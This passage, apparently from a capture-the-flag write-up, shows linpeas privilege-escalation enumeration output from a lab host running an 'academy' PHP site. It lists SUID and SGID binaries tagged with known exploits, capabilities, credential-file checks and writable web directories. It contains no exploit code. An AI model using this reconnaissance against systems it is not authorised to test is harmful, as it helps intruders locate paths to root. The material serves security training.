class="string">anon_upload_enable</span></span><br><span class="line"><span class="string">anon_mkdir_write_enable</span></span><br><span class="line"><span class="string">anon_other_write_enable</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 69 Feb 13  2021 /etc/php/7.3/mods-available/ftp.ini</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 69 Feb 13  2021 /usr/share/php7.3-common/common/ftp.ini</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing DNS Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 856 Mar  1  2019 /usr/share/bash-completion/completions/bind                                           </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 856 Mar  1  2019 /usr/share/bash-completion/completions/bind</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Windows Files (limit 70)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 22 May 29  2021 /etc/alternatives/my.cnf -&gt; /etc/mysql/mariadb.cnf</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 24 May 29  2021 /etc/mysql/my.cnf -&gt; /etc/alternatives/my.cnf</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 83 May 29  2021 /var/lib/dpkg/alternatives/my.cnf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Other Interesting Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc                                                                    </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                      ╔════════════════════════════════════╗</span></span><br><span class="line"><span class="string">══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                            </span></span><br><span class="line"><span class="string">                      ╚════════════════════════════════════╝                                                                  </span></span><br><span class="line"><span class="string">╔══════════╣ SUID - Check easy privesc, exploits and write perms</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              </span></span><br><span class="line"><span class="string">strings Not Found                                                                                                             </span></span><br><span class="line"><span class="string">strace Not Found                                                                                                              </span></span><br><span class="line"><span class="string">-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                     </span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  ---&gt;  SuSE_9.3/10</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  ---&gt;  HP-UX_10.20</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  ---&gt;  BSD/Linux(08-1996)</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                      </span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ SGID</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              </span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd                                                               </span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root tty 15K May  4  2018 /usr/bin/bsd-write</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root tty 35K Jan 10  2019 /usr/bin/wall</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root mail 19K Dec  3  2017 /usr/bin/dotlockfile</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root ssh 315K Jan 31  2020 /usr/bin/ssh-agent</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Checking misconfigurations of ld.so</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                                      </span></span><br><span class="line"><span class="string">/etc/ld.so.conf                                                                                                               </span></span><br><span class="line"><span class="string">Content of /etc/ld.so.conf:                                                                                                   </span></span><br><span class="line"><span class="string">include /etc/ld.so.conf.d/*.conf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/ld.so.conf.d</span></span><br><span class="line"><span class="string">  /etc/ld.so.conf.d/libc.conf                                                                                                 </span></span><br><span class="line"><span class="string">  - /usr/local/lib                                                                                                            </span></span><br><span class="line"><span class="string">  /etc/ld.so.conf.d/x86_64-linux-gnu.conf</span></span><br><span class="line"><span class="string">  - /usr/local/lib/x86_64-linux-gnu                                                                                           </span></span><br><span class="line"><span class="string">  - /lib/x86_64-linux-gnu</span></span><br><span class="line"><span class="string">  - /usr/lib/x86_64-linux-gnu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/ld.so.preload</span></span><br><span class="line"><span class="string">╔══════════╣ Capabilities                                                                                                     </span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                               </span></span><br><span class="line"><span class="string">══╣ Current shell capabilities                                                                                                </span></span><br><span class="line"><span class="string">CapInh:  0x0000000000000000=                                                                                                  </span></span><br><span class="line"><span class="string">CapPrm:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapEff:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span></span><br><span class="line"><span class="string">CapAmb:  0x0000000000000000=</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">══╣ Parent process capabilities</span></span><br><span class="line"><span class="string">CapInh:  0x0000000000000000=                                                                                                  </span></span><br><span class="line"><span class="string">CapPrm:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapEff:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span></span><br><span class="line"><span class="string">CapAmb:  0x0000000000000000=</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Files with capabilities (limited to 50):</span></span><br><span class="line"><span class="string">/usr/bin/ping = cap_net_raw+ep</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ AppArmor binary profiles</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 3129 Feb 10  2019 usr.bin.man                                                                          </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root  730 Nov 25  2020 usr.sbin.mysqld</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Files with ACLs (limited to 50)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                       </span></span><br><span class="line"><span class="string">files with acls in searched folders Not Found                                                                                 </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Files (scripts) in /etc/profile.d/</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                             </span></span><br><span class="line"><span class="string">total 20                                                                                                                      </span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Permissions in init, init.d, systemd, and rc.d</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                               </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">═╣ Hashes inside passwd file? ........... No</span></span><br><span class="line"><span class="string">═╣ Writable passwd file? ................ No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Credentials in fstab/mtab? ........... No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read shadow files? ............. No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read shadow plists? ............ No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I write shadow plists? ........... No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read opasswd file? ............. No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I write in network-scripts? ...... No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read root folder? .............. No                                                                                  </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Searching root files in home dirs (limit 30)</span></span><br><span class="line"><span class="string">/home/                                                                                                                        </span></span><br><span class="line"><span class="string">/root/</span></span><br><span class="line"><span class="string">/var/www</span></span><br><span class="line"><span class="string">/var/www/html</span></span><br><span class="line"><span class="string">/var/www/html/index.html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching folders owned by me containing others files on it (limit 100)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Readable files belonging to root and readable by me but not world readable</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                             </span></span><br><span class="line"><span class="string">/dev/mqueue                                                                                                                   </span></span><br><span class="line"><span class="string">/dev/shm</span></span><br><span class="line"><span class="string">/run/lock</span></span><br><span class="line"><span class="string">/run/lock/apache2</span></span><br><span class="line"><span class="string">/tmp</span></span><br><span class="line"><span class="string">/tmp/linpeas.sh</span></span><br><span class="line"><span class="string">/var/cache/apache2/mod_cache_disk</span></span><br><span class="line"><span class="string">/var/lib/php/sessions</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/15</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/21</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/22</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/28</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/2e</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/31</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/36</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/3b</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/41</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/42</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/43</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4c</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4e</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4f</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/53</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/5c</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/61</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6b</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6c</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/73</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/78</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7d</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7f</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8a</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8b</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/96</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/97</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/99</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9d</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9e</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a0</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a4</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a7</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ae</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/b6</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c3</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c5</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c7</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ca</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/d6</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/dd</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e8</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e9</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/f5</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/fa</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php</span></span><br><span class="line"><span class="string">/var/tmp</span></span><br><span class="line"><span class="string">/var/www/html/academy</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css/bootstrap.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css/font-awesome.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css/style.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/FontAwesome.otf</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/img</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/js</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/js/bootstrap.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/js/jquery-1.11.1.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/change-password.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/check_availability.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/course.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/department.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/edit-course.php</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/config.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/footer.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/header.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/menubar.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/index.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/level.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/logout.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/manage-students.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/print.php</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/assets</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css/bootstrap.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css/font-awesome.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css/style.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/FontAwesome.otf</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.eot</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.woff</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/img</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/js</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/js/bootstrap.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/js/jquery-1.11.1.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/change-password.php</span></span><br><span class="line"><span 